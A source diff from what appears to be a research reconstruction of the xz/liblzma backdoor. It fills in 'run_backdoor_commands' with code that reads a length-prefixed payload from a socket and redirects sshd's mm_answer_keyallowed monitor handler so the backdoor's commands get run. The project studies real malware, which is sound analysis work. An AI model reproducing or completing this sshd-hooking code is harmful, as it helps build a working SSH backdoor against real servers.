@@ -5,8 +5,12 @@
 #include <assert.h>
 #include <openssl/bn.h>
 #include <string.h>
+#include <sys/select.h>
 #include <sys/types.h>
 #include <time.h>
+#include <errno.h>
+
+#define MONITOR_REQ_KEYALLOWED 22
 
 // $FIXME: move to xzre.h
 extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);
@@ -451,7 +455,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 										)) break;
 									}
 
-									// FIXME: set high byte of f.unk50 to 0
+									f.unk57 = 0;
 									memset(f.u.sock.fd_recv_buf, 0x0, sizeof(f.u.sock.fd_recv_buf));
 
 
@@ -460,12 +464,74 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 									if(!ctx->libc_imports->pselect) break;
 									if(!ctx->libc_imports->__errno_location) break;
 
-									/** FIXME: monitor_req flow */
+									int write_idx = f.u.sock.socket_fd / 64;
+
+									int res;
+									for(;;){
+										*(u64 *)&f.u.sock.fd_recv_buf[16] = __builtin_bswap32(0x50);
+										memset(&f.payload, 0x00, 0x80);
+										FD_SET(f.u.sock.socket_fd, (fd_set *)&f.payload);
+										*(struct timespec *)&f.u.sock.fd_recv_buf[8] = (struct timespec){
+											.tv_sec = 0
+										};
+										if((res = ctx->libc_imports->pselect(
+											f.u.sock.socket_fd + 1,
+											(fd_set *)&f.payload,
+											NULL, NULL,
+											(const struct timespec *)&f.u.sock.fd_recv_buf[8],
+											NULL
+										)) >= 0) break;
+										if(*ctx->libc_imports->__errno_location() != EINTR){
+											goto bad_data;
+										}
+									}
+									if(!res) break;
+									if(!FD_ISSET(f.u.sock.socket_fd, (fd_set *)&f.payload.data[8])) break;
+
+									if(fd_read(
+										f.u.sock.socket_fd,
+										f.u.sock.fd_recv_buf,
+										sizeof(u32),
+										ctx->libc_imports
+									) < 0) break;
+
+									*(u32 *)f.u.sock.fd_recv_buf = __builtin_bswap32(*(u32 *)f.u.sock.fd_recv_buf);
+									if((*(u32*)f.u.sock.fd_recv_buf - 1) > 64) break;
+
+									if(fd_read(
+										f.u.sock.socket_fd,
+										&f.unk57,
+										sizeof(u8),
+										ctx->libc_imports
+									) < 0) break;
+
+									ctx->sock_read_buf_size = *(u32 *)f.u.sock.fd_recv_buf - 1;
+									if(fd_read(
+										f.u.sock.socket_fd,
+										ctx->sock_read_buf,
+										ctx->sock_read_buf_size,
+										ctx->libc_imports
+									) < 0) break;
+
+									if(!ctx->sshd_ctx->mm_answer_keyallowed) break;
+
+									int monitor_reqtype;
+									if(TEST_FLAG(f.kctx.args.flags3, 0x3F)){
+										monitor_reqtype = 2 * (f.kctx.args.flags3 & 0x3F);
+									} else {
+										monitor_reqtype = MONITOR_REQ_KEYALLOWED;
+										if(ctx->sshd_ctx->mm_answer_keyallowed_ptr){
+											int *monitor_reqtype_ptr = (int *)PTRDIFF(ctx->sshd_ctx->mm_answer_keyallowed_ptr, 8);
+											monitor_reqtype = *monitor_reqtype_ptr;
+										}
+									}
+									ctx->sshd_ctx->mm_answer_keyallowed_reqtype = monitor_reqtype + 1;
+
+									// replace/hook mm_answer_keyallowed
+									ctx->sshd_ctx->mm_answer_keyallowed_ptr = ctx->sshd_ctx->mm_answer_keyallowed;
 
 									post_exec:
-									// FIXME: erase data (60*4)
-									// more data cleanup..
-
+									memset(&f.payload, 0x00, 0xF0);
 
 									f.payload.data[0] = 0x80;
 									f.payload.data[0xF6] = 8;
